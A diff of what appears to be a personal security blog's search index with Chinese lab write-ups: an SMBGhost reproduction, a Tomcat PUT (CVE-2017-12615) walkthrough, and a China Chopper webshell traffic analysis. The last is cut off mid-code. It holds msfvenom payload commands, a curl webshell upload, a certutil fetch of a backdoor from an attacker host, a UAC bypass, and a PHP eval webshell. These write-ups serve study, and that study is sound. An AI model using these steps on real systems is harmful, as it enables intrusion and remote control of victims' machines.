@@ -75,6 +75,87 @@ iptables -L -n --line-number
       </tags>
   </entry>
   <entry>
+    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
+    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
+<p>SMB远程代码执行漏洞</p>
+<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
+<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
+<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
+</blockquote>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
+Windows 10 Version 1903 for x64-based Systems
+Windows 10 Version 1903 for ARM64-based Systems
+Windows Server, Version 1903 (Server Core installation)
+Windows 10 Version 1909 for 32-bit Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows Server, Version 1909 (Server Core installation)
+</code></pre>
+<p><strong>漏洞复现工具下载</strong></p>
+<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
+<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>将目标机的防火墙关闭</strong></li>
+<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
+<ol start="3">
+<li><strong>利用下载的poc脚本发起攻击</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>生成一个反弹木马</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
+
+   说明: 
+   #-p payload
+   #-e 编码方式
+   #-i 编码次数
+   #-b 过滤坏字符
+   #LHOST,LPORT 监听上线的主机IP和端口
+   #-f python 生成python格式
+   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
+<ol start="2">
+<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
+<ol start="3">
+<li><strong>开启msf监听模块</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
+<ol start="4">
+<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
+<blockquote>
+<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>Windows 10</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL提权</title>
     <url>/2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
@@ -253,87 +334,6 @@ exploit
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
-    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
-<p>SMB远程代码执行漏洞</p>
-<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
-<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
-<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
-</blockquote>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
-Windows 10 Version 1903 for x64-based Systems
-Windows 10 Version 1903 for ARM64-based Systems
-Windows Server, Version 1903 (Server Core installation)
-Windows 10 Version 1909 for 32-bit Systems
-Windows 10 Version 1909 for x64-based Systems
-Windows 10 Version 1909 for ARM64-based Systems
-Windows Server, Version 1909 (Server Core installation)
-</code></pre>
-<p><strong>漏洞复现工具下载</strong></p>
-<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
-<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
-<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
-<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>将目标机的防火墙关闭</strong></li>
-<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
-<ol start="3">
-<li><strong>利用下载的poc脚本发起攻击</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>生成一个反弹木马</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
-
-   说明: 
-   #-p payload
-   #-e 编码方式
-   #-i 编码次数
-   #-b 过滤坏字符
-   #LHOST,LPORT 监听上线的主机IP和端口
-   #-f python 生成python格式
-   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
-<ol start="2">
-<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
-<ol start="3">
-<li><strong>开启msf监听模块</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
-<ol start="4">
-<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
-<blockquote>
-<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>Windows 10</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2019强网杯 随便注</title>
     <url>/2021/04/25/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
     <content><![CDATA[<h2 id="2019-强网杯-随便注"><a href="#2019-强网杯-随便注" class="headerlink" title="[2019 强网杯]随便注"></a>[2019 强网杯]随便注</h2><p><strong>访问题目站点，随便输入就能看到返回结果</strong></p>
@@ -430,6 +430,360 @@ Windows Server, Version 1909 (Server Core installation)
       <tags>
         <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>一次windows渗透测试</title>
+    <url>/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
+<p>靶机IP: 172.16.10.180</p>
+<blockquote>
+<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
+<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
+</blockquote>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
+<blockquote>
+<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
+</blockquote>
+<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfconsole 
+msf6 > use payload/windows/shell_bind_tcp
+msf6 payload(windows/shell_bind_tcp) > set lport 4449
+msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
+[*] Writing 149075 bytes to shell.jsp...
+</code></pre>
+<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
+<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
+<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
+<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
+<p>在C盘下创建back目录</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
+cd c:\
+mkdir back
+cd c:\back
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
+<blockquote>
+<p>上传backdoor.exe后门</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfpc windows 172.16.10.111
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
+<blockquote>
+<p>python快速开启http服务</p>
+</blockquote>
+<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
+<blockquote>
+<p>靶机远程下载<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
+<blockquote>
+<p>kali开启监听</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
+└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
+<blockquote>
+<p>靶机执行<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
+backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
+<blockquote>
+<p>得到shell</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
+<blockquote>
+<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
+<p><strong>得到system权限，提权成功</strong></p>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/05/08/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="中国菜刀原理"><a href="#中国菜刀原理" class="headerlink" title="中国菜刀原理"></a>中国菜刀原理</h1><blockquote>
+<p>本地IP： 172.16.9.12</p>
+<p>目的IP： 172.16.9.163</p>
+<p>WebShell URL： <a href="http://172.16..9.163/test.php">http://172.16..9.163/test.php</a></p>
+<p>WebShell 密码： cmd</p>
+</blockquote>
+<h2 id="抓取菜刀流量"><a href="#抓取菜刀流量" class="headerlink" title="抓取菜刀流量"></a>抓取菜刀流量</h2><blockquote>
+<p>使用<code>Wireshark</code>进行流量抓取</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell"># 过滤语句
+http.request.method == POST and ip.addr == 172.16.9.12
+</code></pre>
+<h2 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
+<span class="token shell-comment comment"># 最基础的PHP一句话木马</span>
+<span class="token shell-comment comment"># $_POST用于收集传递过来的数据</span>
+<span class="token shell-comment comment"># eval将传递过来的数据当做可以执行的PHP代码来执行</span>
+<span class="token shell-comment comment"># 这样就可以将任意的PHP语句传入到网站所在的服务器进行执行。</span>
+</code></pre>
+<h2 id="菜刀流量分析"><a href="#菜刀流量分析" class="headerlink" title="菜刀流量分析"></a>菜刀流量分析</h2><h4 id="连接功能"><a href="#连接功能" class="headerlink" title="连接功能"></a>连接功能</h4><blockquote>
+<p>使用菜刀连接WebShell</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508100925041.png" alt="image-20210508100925041"></p>
+<blockquote>
+<p>通过post传入的<code>cmd</code>参数，参数进行了base64加密</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508094612379.png" alt="image-20210508094612379"></p>
+<pre><code># 原始数据
+QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
+
+# url解码
+QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==
+
+# base64解码
+@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&#39;posix_getegid&#39;))?@posix_getpwuid(@posix_geteuid()):&#39;&#39;;$usr=($u)?$u[&#39;name&#39;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();
+</code></pre>
+<blockquote>
+<p>解码后得到传入的具体payload</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token comment" spellcheck="true">// 临时关闭PHP的错误显示功能</span>
+    @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 防止像dir、上传文件大马时超时</span>
+    @<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 关闭魔术引号，这东西在4.0以后就不怎么用了</span>
+    @<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"->|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 将访问的路径复制给了$D</span>
+    <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$D</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"PATH_TRANSLATED"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 打开指定路径后将返回值赋值给了$R</span>
+    <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string">"&amp;#123;$D&amp;#125;\t"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"Z"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$L</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string">"&amp;#123;$L&amp;#125;:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$R</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"&amp;#123;$L&amp;#125;:"</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token variable">$R</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\t"</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// 将$R的内容显示出来，如果不存在就输出PATH_TRANSLATED</span>
+    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'posix_getegid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span>     @<span class="token function">posix_getpwuid</span><span class="token punctuation">(</span>@<span class="token function">posix_geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$u</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> @<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$R</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$R</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"(&amp;#123;$usr&amp;#125;)"</span><span class="token punctuation">;</span>
+    <span class="token keyword">print</span> <span class="token variable">$R</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<h4 id="文件管理功能"><a href="#文件管理功能" class="headerlink" title="文件管理功能"></a>文件管理功能</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508102234357.png" alt="image-20210508102234357"></p>
+<p>可以看到有两个参数<code>z0</code>和<code>z1</code>：</p>
+<blockquote>
+<p><code>z0</code>为发送的payload</p>
+<p><code>z1</code>为查询的路径</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># z0传入的payload</span>
+<span class="token delimiter">&lt;?php</span>   
+@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"->|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
